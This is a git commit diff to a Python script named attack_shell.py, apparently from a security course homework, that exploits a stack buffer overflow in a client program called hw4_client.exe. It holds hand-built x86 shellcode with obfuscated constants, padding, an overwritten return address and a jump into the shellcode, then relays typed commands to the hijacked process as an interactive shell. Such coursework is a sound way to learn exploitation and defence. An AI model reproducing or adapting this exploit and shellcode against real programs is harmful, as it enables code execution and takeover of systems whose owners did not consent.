8c74c1efb9e8ab3bd4166e07c4f2936a2fdfaae0
orel-david <42713127+orel-david@users.noreply.github.com>
2024-08-24 12:52:44 +0300

    WRAP UP PART3

--- HW4/attack_shell.py
+++ HW4/attack_shell.py
@@ -3,32 +3,36 @@ import subprocess
 from ctypes import wintypes
 
 
-address_of_jump_esp_gaddget = 0x4b31eb7a
 
-def GetModuleHandle(module):
-    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
-    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
-    hMod = kernel32.GetModuleHandleW(module)
+def GetModuleHandle(module):     
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)     
+    kernel32.GetModuleHandleW.restype = wintypes.HMODULE     
+    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]     
+    hMod = kernel32.GetModuleHandleW(module)     
     return hMod 
 
 ntdll_base = GetModuleHandle("ntdll")
-offset_from_base = address_of_jump_esp_gaddget - ntdll_base
 
 exe_path = "hw4_client.exe"
 
 # Start the process
-process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False)
-input()
-
+process = subprocess.Popen(exe_path, stdin=subprocess.PIPE)
 address_of_socket = "\x5F\xFD\x90"
 address_of_shellCode = "\x5F\xDC\xE8"
 
 first_input = b"archer\n56M9JNQ60KB7APLC\nPEEK\n"
-shellCode = b"\x68\x50\x45\x45\x4B\x89\xE0\xBB\x2F\xA5\xA0\xFF\xF7\xD3\x53\x50\xB8\xBD\x19\x50\x62\xFF\xD0\x58\x58\x58\xB8\xFF\xFF\xFF\xFF\xF7\xD0\x50\xB8\x7F\x7F\xAF\x9D\xF7\xD0\x50\xB8\x2F\xE5\xA0\xFF\xF7\xD0\x50\x6A\x07\xB8\x6F\x02\xA0\xFF\xF7\xD0\xFF\x30\xB8\x92\x18\x50\x62\xFF\xD0\x58\x58\x58\x58\x58\xB8\x17\x23\xA0\xFF\xF7\xD0\xFF\xE0" + b"\x90" * 0X2046
+shellCode = b"\xB8\x63\xDF\xFF\xFF\xF7\xD0\x29\xC4\x68\x50\x45\x45\x4B\x89\xE0\xBB\x2F\xA5\xA0\xFF\xF7\xD3\x53\x50\xB8\xBD\x19\x50\x62\xFF\xD0\x58\x58\x58\xB8\xFF\xFF\xFF\xFF\xF7\xD0\x50\xB8\x7F\x7F\xAF\x9D\xF7\xD0\x50\xB8\x2F\xA5\xA0\xFF\xF7\xD0\x50\x6A\x07\xB8\x6F\x02\xA0\xFF\xF7\xD0\xFF\x30\xB8\x92\x18\x50\x62\xFF\xD0\x58\x58\x58\x58\x58\xB8\x17\x23\xA0\xFF\xF7\xD0\xFF\xE0" + b"A" * 0X203D
 new_ret_address = b"( Pb"
-jump_to_shellCode = b"\xE9\x5F\xDF\xFF\xFF"
+jump_to_shellCode = b"\xE9\x5F\xDF\xFF\xFF\n"
 
-payload = first_input + shellCode + new_ret_address + jump_to_shellCode 
+payload = first_input + shellCode + new_ret_address + jump_to_shellCode
+process.stdin.write(payload)
+process.stdin.flush()
 
-output, error = process.communicate(input = payload)
+while True:
+    myInput = input()
+    if myInput == 'exit':
+        process.kill()
+        break
+    process.stdin.write(str.encode(myInput + "\n"))
+    process.stdin.flush()
